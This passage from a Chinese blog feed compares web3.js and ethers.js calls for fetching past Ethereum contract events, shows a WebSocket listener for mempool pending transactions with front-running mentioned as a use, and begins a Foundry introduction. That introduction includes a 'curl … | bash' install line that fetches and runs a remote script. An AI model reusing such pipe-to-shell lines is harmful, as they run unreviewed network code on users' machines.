class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">'web3'</span>);</span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> Web3(<span class="string">'http://127.0.0.1:8545/'</span>);</span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">'0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9'</span>;</span><br><span class="line"><span class="keyword">const</span> contractAbi = [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"anonymous"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"indexed"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"num"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Return"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"event"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"inputs"</span>: [],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"increment"</span>,</span><br><span class="line"><span class="string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> contract = <span class="keyword">new</span> web3.eth.Contract(contractAbi, contractAddress);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PAST_EVENT = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> contract.methods.increment().send(&#123;<span class="attr">from</span>: <span class="string">"0x70997970C51812dc3A010C7d01b50e0d17dc79C8"</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> contract.getPastEvents(<span class="string">'Return'</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// filter: &#123;num: [0,100]&#125;, </span></span><br><span class="line">        fromBlock: <span class="number">0</span>,</span><br><span class="line">        toBlock: <span class="string">'latest'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      (err, events) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(events);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">PAST_EVENT();</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    removed: false,</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    transactionHash: '0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e',</span><br><span class="line">    blockHash: '0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d',</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',</span><br><span class="line">    id: 'log_77c8ec37',</span><br><span class="line">    returnValues: Result &#123; '0': '1', num: '1' &#125;,</span><br><span class="line">    event: 'Return',</span><br><span class="line">    signature: '0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab',</span><br><span class="line">    raw: &#123;</span><br><span class="line">      data: '0x0000000000000000000000000000000000000000000000000000000000000001',  </span><br><span class="line">      topics: [Array]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="ether-js"><a href="#ether-js" class="headerlink" title="ether.js"></a>ether.js</h4><p>ether.js中的类似函数我找了很久，翻遍了文档才找到。</p><h5 id="provider-getLogs"><a href="#provider-getLogs" class="headerlink" title="provider.getLogs()"></a>provider.getLogs()</h5><p>从名字中就能看出来这和函数是获取日志。</p><p>使用方法倒是简单很多：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> contractAddress = <span class="string">"0x5FbDB2315678afecb367f032d93F642f64180aa3"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tokenAbi =[</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"anonymous"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"indexed"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"num"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Return"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"event"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"inputs"</span>: [],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"increment"</span>,</span><br><span class="line"><span class="string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getevent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.JsonRpcProvider()</span><br><span class="line">    <span class="keyword">const</span> [deployer] =  <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line"><span class="keyword">const</span> TokenContract = <span class="keyword">new</span> ethers.Contract(contractAddress, tokenAbi, provider);</span><br><span class="line">    TokenContract.connect(deployer).increment();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">let</span> filter = TokenContract.filters.Return();</span><br><span class="line"><span class="keyword">let</span> filterLog = &#123;</span><br><span class="line">fromBlock : <span class="number">0</span>,</span><br><span class="line">toBlock : <span class="string">'latest'</span>,</span><br><span class="line">topics : filter.topics</span><br><span class="line">  &#125;</span><br><span class="line">provider.getLogs(filterLog).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">getevent()</span><br></pre></td></tr></table></figure><p>事件查询结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: '0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d',</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',</span><br><span class="line">    data: '0x0000000000000000000000000000000000000000000000000000000000000001',    </span><br><span class="line">    topics: [</span><br><span class="line">      '0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab'</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: '0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e',</span><br><span class="line">    logIndex: 0</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="Contract-queryFilter"><a href="#Contract-queryFilter" class="headerlink" title="Contract.queryFilter"></a>Contract.queryFilter</h5><p>这也是从合约中获取历史事件的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> contractAddress = <span class="string">"0x5FbDB2315678afecb367f032d93F642f64180aa3"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tokenAbi =[</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"anonymous"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"indexed"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"num"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Return"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"event"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"inputs"</span>: [],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"increment"</span>,</span><br><span class="line"><span class="string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// export const getListOfTransfers = async (pairAddress) =&gt; &#123;</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getevent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.JsonRpcProvider()</span><br><span class="line">    <span class="keyword">const</span> [deployer] =  <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line"><span class="keyword">const</span> TokenContract = <span class="keyword">new</span> ethers.Contract(contractAddress, tokenAbi, provider);</span><br><span class="line">    TokenContract.connect(deployer).increment();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">let</span> filter = TokenContract.filters.Return();</span><br><span class="line"><span class="keyword">let</span> filterLog = &#123;</span><br><span class="line">fromBlock : <span class="number">0</span>,</span><br><span class="line">toBlock : <span class="string">'latest'</span>,</span><br><span class="line">topics : filter.topics</span><br><span class="line">  &#125;</span><br><span class="line">provider.getLogs(filterLog).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let eventsWith = await TokenContract.queryFilter(filterLog, 0, 'latest');</span></span><br><span class="line">    <span class="comment">// console.log(eventsWith);</span></span><br><span class="line">    <span class="comment">// return eventsWith;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">getevent()</span><br></pre></td></tr></table></figure><p>查询结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: '0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d',</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',</span><br><span class="line">    data: '0x0000000000000000000000000000000000000000000000000000000000000001',</span><br><span class="line">    topics: [</span><br><span class="line">      '0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab'</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: '0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e',</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    removeListener: [Function (anonymous)],</span><br><span class="line">    getBlock: [Function (anonymous)],</span><br><span class="line">    getTransaction: [Function (anonymous)],</span><br><span class="line">    getTransactionReceipt: [Function (anonymous)],</span><br><span class="line">    event: 'Return',</span><br><span class="line">    eventSignature: 'Return(uint256)',</span><br><span class="line">    decode: [Function (anonymous)],</span><br><span class="line">    args: [ BigNumber &#123; value: "1" &#125;, num: BigNumber &#123; value: "1" &#125; ]</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="比较三种查询历史事件的结果："><a href="#比较三种查询历史事件的结果：" class="headerlink" title="比较三种查询历史事件的结果："></a>比较三种查询历史事件的结果：</h3><p>web3.js—<code>contract.getPastEvents()</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    removed: false,</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    transactionHash: &#39;0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e&#39;,</span><br><span class="line">    blockHash: &#39;0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d&#39;,</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    address: &#39;0x5FbDB2315678afecb367f032d93F642f64180aa3&#39;,</span><br><span class="line">    id: &#39;log_77c8ec37&#39;,</span><br><span class="line">    returnValues: Result &#123; &#39;0&#39;: &#39;1&#39;, num: &#39;1&#39; &#125;,</span><br><span class="line">    event: &#39;Return&#39;,</span><br><span class="line">    signature: &#39;0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab&#39;,</span><br><span class="line">    raw: &#123;</span><br><span class="line">      data: &#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;,  </span><br><span class="line">      topics: [Array]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ether.js—<code>provider.getLogs()</code>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: &#39;0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d&#39;,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: &#39;0x5FbDB2315678afecb367f032d93F642f64180aa3&#39;,</span><br><span class="line">    data: &#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;,    </span><br><span class="line">    topics: [</span><br><span class="line">      &#39;0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab&#39;</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: &#39;0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e&#39;,</span><br><span class="line">    logIndex: 0</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ether.js—<code>Contract.queryFilter()</code>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: &#39;0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d&#39;,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: &#39;0x5FbDB2315678afecb367f032d93F642f64180aa3&#39;,</span><br><span class="line">    data: &#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;,</span><br><span class="line">    topics: [</span><br><span class="line">      &#39;0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab&#39;</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: &#39;0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e&#39;,</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    removeListener: [Function (anonymous)],</span><br><span class="line">    getBlock: [Function (anonymous)],</span><br><span class="line">    getTransaction: [Function (anonymous)],</span><br><span class="line">    getTransactionReceipt: [Function (anonymous)],</span><br><span class="line">    event: &#39;Return&#39;,</span><br><span class="line">    eventSignature: &#39;Return(uint256)&#39;,</span><br><span class="line">    decode: [Function (anonymous)],</span><br><span class="line">    args: [ BigNumber &#123; value: &quot;1&quot; &#125;, num: BigNumber &#123; value: &quot;1&quot; &#125; ]</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>可以看到由于<code>provider.getLogs()</code>函数获取的数据是从日志里拿的，已经筛除掉了一部分的交易信息。</p><p><code>getLogs</code>方法不会返回事件的返回值！</p><p>其他两个函数获取的数据差距不大，ether.js—<code>Contract.queryFilter()</code>函数的数据会全一点。并且会方便很多</p><h2 id="获取待处理交易流："><a href="#获取待处理交易流：" class="headerlink" title="获取待处理交易流："></a>获取待处理交易流：</h2><h3 id="什么是待处理交易"><a href="#什么是待处理交易" class="headerlink" title="什么是待处理交易"></a>什么是待处理交易</h3><p>要在以太坊网络编写或者更新任何内容，需要有人创建，签署和发送交易。交易是外部世界与以太坊网络通信的方式。当发送到以太坊网络时，交易会停留在称为“mempool”的队列中，交易等待旷工被处理——- 处于这种等待交易称为待处理交易。发送交易所需要的少量费用称为gas;交易被旷工包含在一个区块中，并且根据它们包含的给旷工的gas 价格来确定优先级 。</p><p>查看<a href="https://www.quicknode.com/guides/defi/how-to-access-ethereum-mempool" target="_blank" rel="noopener">这里</a>, 将得到关于内存池和待处理交易的更多信息。</p><p><strong>我为什么需要查看未处理的交易呢？</strong></p><p>通过检查待处理的交易，可以执行以下操作：</p><ul><li>估计gas：理论上我们可以查看待处理的交易来预测下一个区块的最优gas价格。</li><li>用于交易分析：我们可以分析去中心化交易所中的待处理交易，以便预测市场趋势。</li><li>交易抢跑：在 DeFi 中，你可以预览即将到来的与价格（预言机）相关的交易，并可能对 MKR、COMP 和其他协议的保险库发出清算。</li></ul><p>应用此方法我们可以完成一个简单的套利机器人</p><p>我们将使用WebSockets处理这些待处理的交易流</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ethers = <span class="built_in">require</span>(<span class="string">"ethers"</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"wss"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> init = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> customWsProvider = <span class="keyword">new</span> ethers.providers.WebSocketProvider(url);</span><br><span class="line">  <span class="built_in">console</span>.log(customWsProvider.listeners.toString())</span><br><span class="line">  customWsProvider.on(<span class="string">"pending"</span>, (tx) =&gt; &#123;</span><br><span class="line">    customWsProvider.getTransaction(tx).then(<span class="function"><span class="keyword">function</span> (<span class="params">transaction</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(transaction);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  customWsProvider._websocket.on(<span class="string">"error"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Unable to connect to <span class="subst">$&#123;ep.subdomain&#125;</span> retrying in 3s...`</span>);</span><br><span class="line">    setTimeout(init, <span class="number">3000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  customWsProvider._websocket.on(<span class="string">"close"</span>, <span class="keyword">async</span> (code) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(</span><br><span class="line">      <span class="string">`Connection lost with code <span class="subst">$&#123;code&#125;</span>! Attempting reconnect in 3s...`</span></span><br><span class="line">    );</span><br><span class="line">    customWsProvider._websocket.terminate();</span><br><span class="line">    setTimeout(init, <span class="number">3000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">init();</span><br></pre></td></tr></table></figure><p>查询结果：<br><img src="transFlow.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Foundry-很牛逼的框架</title>
      <link href="/Foundry/"/>
      <url>/Foundry/</url>
      
        <content type="html"><![CDATA[<h1 id="Foundry-很牛逼的框架"><a href="#Foundry-很牛逼的框架" class="headerlink" title="Foundry-很牛逼的框架"></a>Foundry-很牛逼的框架</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>最近在做CTF的时候发现题目使用了Foundry来部署，于是抱着好奇心研究了一下Foundry。不得不说，这个框架真的很牛逼，最直观的是他的测试速度。其次是其再测试时可以输出很多详细信息（以后碰到revert再也不用一行代码一行代码的去找错了）</p><p>下面咱们来细说Foundry：</p><h2 id="为什么用Foundry？"><a href="#为什么用Foundry？" class="headerlink" title="为什么用Foundry？"></a>为什么用Foundry？</h2><ul><li>Foundry使用solidity来编写单元测试，而不是JavaScript或python</li><li>编译和测试的速度快</li><li>内置模糊测试</li><li>Gas优化工具</li><li>很详尽的Traces信息</li><li>支持主网分叉</li><li>Etherscan 代码验证</li><li>硬件钱包兼容</li><li>通过作弊代码操纵区块链状态</li></ul><p>展示一段测试结果，大家就能明白foundry的强大<br><img src="Foundry.png" alt=""></p><h2 id="Foundry简介"><a href="#Foundry简介" class="headerlink" title="Foundry简介"></a>Foundry简介</h2><p>Foundry 是一个新出的由rust写的合约开发框架。</p><p>rust一直在改变编程界的格局，btc C语言开发，eth go主导，也有 rust 的eth<br>波卡链 直接rust，兴起跨链的生态。</p><p>快和安全，就是rust 优势吧。在foundry中也体现出了这点。</p><p><a href="https://book.getfoundry.sh/" target="_blank" rel="noopener">Foundry Book</a></p><h2 id="Foundry安装"><a href="#Foundry安装" class="headerlink" title="Foundry安装"></a>Foundry安装</h2><p>由于Foundry是基于Rust开发的，所以在linux下安装会非常方便。</p><h3 id="Linux-Mac"><a href="#Linux-Mac" class="headerlink" title="Linux/Mac:"></a><strong>Linux/Mac</strong>:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https:&#x2F;&#x2F;foundry.paradigm.xyz | bash;</span><br><span class="line">foundryup</span><br></pre></td></tr></table></figure><p>两行命令搞定</p><p><strong>Windows</strong>: (需要rust环境，再次不多赘述)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 